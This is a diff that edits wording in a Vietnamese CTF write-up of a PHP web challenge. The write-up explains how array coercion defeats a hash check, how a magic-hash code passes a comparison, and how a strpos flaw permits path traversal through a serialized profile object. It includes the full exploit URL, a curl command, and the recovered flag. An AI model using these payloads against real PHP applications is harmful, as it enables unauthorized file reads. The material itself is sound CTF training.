@@ -22,13 +22,13 @@ Trang chủ là một "cổng di trú" (`One request. Zero exceptions.`) và t�
 <div><dt>Profile</dt><dd>A Base64url-encoded PHP profile export</dd></div>
 ```
 
-Toàn bộ logic nằm trong một file `src/index.php` duy nhất, chạy trên `php:8.3-cli` với `php -S 0.0.0.0:8080 -t /var/www/html`. Trang đích in cờ bằng:
+Toàn bộ logic nằm trong một file `src/index.php` duy nhất, chạy trên `php:8.3-cli` với `php -S 0.0.0.0:8080 -t /var/www/html`. Trang đích in flag bằng:
 
 ```php
 echo '<p class="flag">' . htmlspecialchars((string) $profile, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';
 ```
 
-`flag.txt` trong handout chứa `FortID{redacted}` (17 B) — đây là placeholder do deploy script chèn bằng biến môi trường `FLAG`, không phải cờ. Đường dẫn thật trên container là `/tmp/flag`, được symlink thành `/flag`, và `entrypoint.sh` giới hạn `www-data` đọc cờ từ file đó.
+`flag.txt` trong handout chứa `FortID{redacted}` (17 B) — đây là placeholder do deploy script chèn bằng biến môi trường `FLAG`, không phải flag. path thật trên container là `/tmp/flag`, được symlink thành `/flag`, và `entrypoint.sh` giới hạn `www-data` đọc flag từ file đó.
 
 ## Phân tích
 
@@ -54,7 +54,7 @@ $backupMaterial  = 'legacy-recovery:v1:' . $backup;
 if (!hash_equals($primaryHash, $backupHash)) { ... }
 ```
 
-Ép hai mảng thành chuỗi cho ra `"Array"` như nhau, nên `primary[]=1&backup[]=2` là hai mảng khác nhau (`===` false, cùng `get_debug_type` = `array`) nhưng cho digest giống hệt nhau. Đây là kiểu đối chiếu mà `hash_equals` không phát hiện được, vì hai chuỗi đầu vào của nó đã bằng nhau từ trước khi băm.
+Ép hai array thành chuỗi cho ra `"Array"` như nhau, nên `primary[]=1&backup[]=2` là hai array khác nhau (`===` false, cùng `get_debug_type` = `array`) nhưng cho digest giống hệt nhau. Đây là kiểu đối chiếu mà `hash_equals` không phát hiện được, vì hai chuỗi input của nó đã bằng nhau từ trước khi băm.
 
 **Cổng 3 — magic hash.** `index.php:167-176`:
 
@@ -89,7 +89,7 @@ $contents = file_get_contents($path);
 
 `strpos` trả `0` khi chuỗi **bắt đầu** bằng `../`, và `0` là falsy, nên chuỗi thông qua. `__DIR__` là `/var/www/html`, do đó `../../../../tmp/flag` (đúng bốn cấp) về `/tmp/flag`. Không có `basename`, không có tiền tố bị loại, và `file_get_contents` đọc toàn bộ file.
 
-Cổng `manual` (`index.php:80-101`) dùng `str_contains($manual, '../')` trên chính giá trị đã decode, nên mẹo `strpos` ở trên không áp dụng được cho nó; `manual` chỉ cho phép đọc file có hậu tố `.php` và là đường dẫn hữu ích duy nhất cho recon nguồn.
+Cổng `manual` (`index.php:80-101`) dùng `str_contains($manual, '../')` trên chính giá trị đã decode, nên mẹo `strpos` ở trên không áp dụng được cho nó; `manual` chỉ cho phép đọc file có hậu tố `.php` và là path hữu ích duy nhất cho recon nguồn.
 
 ## Lời giải
 
@@ -147,13 +147,13 @@ if __name__ == "__main__":
     print(body)
 ```
 
-Kiểm chứng từng cổng một theo thứ tự tăng dần độ khó, trước khi đọc cờ. Trên instance thật, `../../../../etc/hostname` trả đúng hostname container:
+Kiểm chứng từng cổng một theo thứ tự tăng dần độ khó, trước khi đọc flag. Trên instance thật, `../../../../etc/hostname` trả đúng hostname container:
 
 ```text
 ../../../../etc/hostname => app
 ```
 
-rồi chuyển sang đường đọc cờ:
+rồi chuyển sang đường đọc flag:
 
 ```text
 ../../../../tmp/flag => FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}
@@ -165,7 +165,7 @@ URL cuối cùng (đã lưu nguyên văn trong phiên giải):
 https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com/?access%20level=administrator&primary[]=1&backup[]=2&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ
 ```
 
-Một request `curl` riêng lẻ xác nhận đúng một lần nữa bằng cách chỉ lấy dòng cờ trong HTML:
+Một request `curl` riêng lẻ xác nhận đúng một lần nữa bằng cách chỉ lấy dòng flag trong HTML:
 
 ```console
 $ curl -s 'https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com/?access%20level=administrator&primary[]=1&backup[]=2&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ' | grep -o '<p class="flag">[^<]*'
@@ -216,7 +216,7 @@ FOUND 59036305 md5= 0e3791209 sha256= 0e9920675
 FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}
 ```
 
-Cờ đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.
+Flag đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.
 
 ## Tái hiện
 
